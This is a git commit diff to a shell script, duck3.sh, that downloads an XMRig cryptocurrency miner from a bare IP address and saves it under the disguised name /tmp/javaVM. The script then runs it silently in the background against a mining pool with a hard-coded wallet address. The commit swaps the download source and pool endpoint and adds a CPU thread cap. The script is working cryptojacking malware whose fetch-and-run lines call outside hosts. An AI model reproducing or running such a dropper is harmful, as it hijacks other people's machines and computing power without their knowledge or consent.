3733522e24976a8cad06093fc6684e0a23464bf8
cronjob <thesunofme1@gmail.com>
2023-11-22 17:28:15 +0700

    Update duck3.sh

--- duck3.sh
+++ duck3.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls > /dev/null 2>&1 &
+ 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --cpu-max-threads-hint=50 > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
+ 		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls > /dev/null 2>&1 &
+ 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --cpu-max-threads-hint=50 > /dev/null 2>&1 &
 fi
